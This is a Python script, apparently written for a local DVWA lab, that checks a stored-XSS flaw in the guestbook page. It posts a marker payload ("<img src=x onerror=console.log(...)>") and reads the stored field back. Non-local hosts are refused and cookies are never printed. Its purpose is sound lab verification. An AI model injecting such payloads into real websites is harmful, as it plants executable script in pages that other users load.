#!/usr/bin/env python3
# XSS-005 / DVWA stored-XSS harmless-marker verification draft (local lab only).
# Python 3.8+, standard library only. Never prints Cookie/token values.

import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
PAGE_PATH = "/vulnerabilities/xss_s/"
NAME_VALUE = "LLM_LAB"
PAYLOAD = "<img src=x onerror=console.log('LLM_LAB_XSS')>"
ROW_RE = re.compile(
    r'<div id="guestbook_comments">Name:\s*(?P<name>.*?)<br />\s*'
    r'Message:\s*(?P<comment>.*?)<br /></div>',
    re.S,
)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def load_cookie(path):
    with open(path, "r", encoding="utf-8") as fh:
        return fh.read().strip()


def fetch(url, cookie, data=None, timeout=10):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    req.add_header("Cookie", cookie)
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body


def rows(html):
    return [m.groupdict() for m in ROW_RE.finditer(html)]


def find_probe(all_rows):
    return [r for r in all_rows if r["name"].strip() == NAME_VALUE]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1:8080")
    ap.add_argument("--cookie-file", required=True,
                    help="local file holding the Cookie header (PHPSESSID=...; security=low)")
    ap.add_argument("--security", default="low",
                    help="value used for the security cookie if absent")
    args = ap.parse_args()

    parsed = urllib.parse.urlparse(args.base_url)
    if parsed.scheme not in ("http", "https") or parsed.hostname not in ALLOWED_HOSTS:
        sys.exit("refusing non-local target: %r" % args.base_url)

    cookie = load_cookie(args.cookie_file)
    if "security=" not in cookie:
        cookie = cookie.rstrip("; ") + "; security=" + args.security
    url = args.base_url.rstrip("/") + PAGE_PATH

    status, html = fetch(url, cookie)
    print("[1] baseline GET status=%s rows=%d marker_present=%s"
          % (status, len(rows(html)), PAYLOAD in html))
    if find_probe(rows(html)):
        print("    note: a row named %s already exists; delete it before writing" % NAME_VALUE)

    body = urllib.parse.urlencode({
        "txtName": NAME_VALUE,
        "mtxMessage": PAYLOAD,
        "btnSign": "Sign Guestbook",
    }).encode("utf-8")
    status, html = fetch(url, cookie, data=body)
    print("[2] write POST status=%s" % status)

    status, html = fetch(url, cookie)
    probe = find_probe(rows(html))
    print("[3] read GET status=%s probe_rows=%d" % (status, len(probe)))
    if not probe:
        sys.exit("probe row not found: check session/login, DB state, security level, "
                 "or whether the included write handler is fragment A (low.php)")

    comment = probe[0]["comment"]
    print("    stored comment field: %r" % comment)
    print("    raw_payload_in_field=%s encoded_lt_in_field=%s"
          % (PAYLOAD in comment, "&lt;img" in comment))

    imp_cookie = re.sub(r"security=[^;]+", "security=impossible", cookie)
    status, html = fetch(url, imp_cookie)
    imp = find_probe(rows(html))
    enc = imp[0]["comment"] if imp else ""
    print("[4] control GET status=%s encoded_lt=%s raw_payload=%s"
          % (status, "&lt;img" in enc, PAYLOAD in enc))

    print("[5] browser step: open %s in the logged-in browser and watch DevTools "
          "console for LLM_LAB_XSS; the HTTP evidence above is not execution evidence" % url)
    print("[6] cleanup: DELETE FROM guestbook WHERE name = '%s'; then repeat step [3] "
          "to confirm the probe row is gone (do not use btnClear, it truncates all rows)"
          % NAME_VALUE)


if __name__ == "__main__":
    main()
